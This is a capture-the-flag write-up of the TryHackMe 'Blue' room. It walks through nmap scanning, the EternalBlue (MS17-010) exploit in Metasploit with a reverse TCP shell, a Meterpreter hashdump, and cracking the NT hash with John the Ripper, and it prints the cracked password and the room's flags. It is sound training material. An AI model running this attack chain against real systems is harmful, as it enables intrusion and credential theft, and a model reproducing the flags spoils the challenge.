# Blue

Author: Corbett Stephens || July 14, 2021 || Contact: corbettdstephens@gmail.com

Blue is a TryHackMe room that explores the "Eternal Blue" exploit from older versions of Windows. 

The room can be found [here](https://tryhackme.com/room/blue).

---

The first thing I do is start up openvpn that way I can connect to the TryHackMe rooms.

`sudo openvpn nullbett.ovpn`

## Reconnaissance
Host ip address: `10.10.48.230`

Next, I ping the host to see if I can get a response.

`ping 10.10.48.230`

Response:

<pre>
PING 10.10.48.230 (10.10.48.230) 56(84) bytes of data.
64 bytes from 10.10.48.230: icmp_seq=1 ttl=125 time=180 ms
64 bytes from 10.10.48.230: icmp_seq=2 ttl=125 time=202 ms
64 bytes from 10.10.48.230: icmp_seq=3 ttl=125 time=224 ms
64 bytes from 10.10.48.230: icmp_seq=4 ttl=125 time=144 ms
64 bytes from 10.10.48.230: icmp_seq=5 ttl=125 time=167 ms
64 bytes from 10.10.48.230: icmp_seq=6 ttl=125 time=189 ms
^C64 bytes from 10.10.48.230: icmp_seq=7 ttl=125 time=212 ms
64 bytes from 10.10.48.230: icmp_seq=8 ttl=125 time=235 ms
^C
--- 10.10.48.230 ping statistics ---
8 packets transmitted, 8 received, 0% packet loss, time 7010ms
rtt min/avg/max/mdev = 144.010/193.973/235.202/28.333 ms
</pre>

We can see that the host is up and running, so now I can start with a nmap scan.

I ran the command:

`nmap -p0-1000 -sC -sV -vv 10.10.48.230 -oN initial.nmap`

- "-p0-1000" scans the first 1000 ports
- "-sC" uses the default script for enumeration
- "-sV" tries to specify versions
- "-vv" extra verbosity
- "-oN initial.nmap" writes the output to the file initial.nmap

Looking at the [output](https://github.com/nullbett/tryhackme/blob/main/blue/initial.nmap) I see that three ports are open.

<pre>
PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
</pre>

I also get a hint that a potential user is "Jon".

The next thing I would do is run another nmap scan to look for vulnerablities. This could be done in the initial nmap scan, but I decided to use two seperate scans. If stealth was a concern then I would do the previous steps differently.

To scan for vulnerabilites I used the same command but changed the script to "vuln".

`nmap -p0-1000 --script vuln -sV -vv 10.10.48.230 -oN vuln.nmap`

Luckily, the results yield some intersting information.

<pre>
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
</pre>

Do to the vuln script I can see that this system is vulnerable to smb-vuln-ms17-010 which allows for remote code execution.

A simple google search of "smb-vuln-ms17-010" will pull up the information about this vulnerability. Reading the first line of the [article](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html) we can see that ms17-010 is also known as "EternalBlue". This is helpful information because it will make it easier to find a module within Metasploit.

---

## Gaining Access

I now want to try to gain futher access on this machine. I have a potential attack vector by using the information on EternalBlue.

The first thing I do is fire up Metasploit!

I use Kali Linux which has Metasploit already installed. All I have to do is hit the home button and search for Metasploit. Once the metasploit shell is spawned the fun can begin. I now look for a module that uses the EternalBlue exploit.

This can be done via: `search eternalblue` in the metasploit shell.

The results I find are as shown below:

![](./pictures/ms_module.png)

The module I want is **exploit/windows/smb/ms17_010_eternalblue** because this uses a windows versions prior to windows 8.

An easy way to select the module you want to use is to enter `use <number>`, so I would enter "use 2" in this case.

Each module has required fields that have to be set before an exploit can be ran. This can be found by entering `options` into the shell. 

![](./pictures/module_options.png)

I need to set the RHOSTS which is the target host that we are attacking. I do this by entering:

`set RHOSTS 10.10.48.230`

In a normal TCP/IP connection, the client will issue a request to the server. The server will then respond the client. The client will respond again a connection will be established. If the server is using a firewall then this normal type of connection will be blocked. When reverse tcp is used, the server initiates a connection to the client (hense reverse). This allows for the client to reply to the server request and establish a connection. The playload that needs to be used is **windows/x64/shell/reverse_tcp**. 

The payload is set by doing `set payload windows/x64/shell/reverse_tcp`.

To run the exploit enter `exploit` or `run`.

If the exploit is successful then a DOS (disk operationg system) shell will appear as shown below.

![](./pictures/dos.png)

If I run "whoami" it says that I am "nt authority\system" which has very sensative user privlages.

I want upgrade this shell to a meterprerter shell as there are a lot of benefits to using a meterpreter shell. I used this [article](https://www.hackingarticles.in/command-shell-to-meterpreter/) to help me figure out how to upgrade my shell. 

To upgrade: `sessions -u 1`

![](./pictures/shell_2_meterpreter.png)

Now that we have our meterpreter shell, we can run "getsystem" to ensure that we are indeed "nt authority\system".

Just because our user is system, doesnt mean that the process is. We will want to switch our process to one that is running "nt authority\system". 


Meterpreter has a handy command to dump the SAM database. SAM is the system accounts manager. The SAM database stores passwords locally. By using the `hashdump` command I can get this data and try to make something useful with it.

I get the following data:

<pre>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</pre>

In this case, I am interested in Jon. I created a file named "jon.hash" and put the hash values into the file. To crack this hash, I used John the Ripper which comes default on Kali Linux. I ran the following commands:

`john jon.hash --format=NT --wordlist=./rockyou.txt`
`john jon.hash --format=NT --show`

- "jon.hash" the file reading from
- "--format=NT" NT is the format of the hash that I got from the hash dump. It is common on Windows systems. I had to figure this out by researching the type of hash.
- "wordlist=./rockyou.txt" This uses a large file of common passwords to try to find the user password for Jon.
- "--show" Show the output.
<pre>
Jon:**alqfna22**:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</pre>

Username: Jon
Password: **alqfna22**

---

## Find Flags
This part is just for answer the questions on TryHackMe.

The first flag can be found in the at the root.

Flag 1: `flag{access_the_machine}`

The second flag is found in config
C:\Windows\system32\config

Flag 2: `flag{sam_database_elevated_access}`

Flag 3 can be found in C:\Users\Jon\Documents

Flag 3: `flag{admin_documents_can_be_valuable}`

---

# Conclusion

This room allowed me to fully execute the famous EternalBlue exploit from top to bottom. In the process, I strengethed my skills in nmap, Metasploit, and John the Ripper. I started my reconnaissance with nmap, developed my attack vector with Metasploit, and derived user credentials with John the Ripper.

Thank you,
Corbett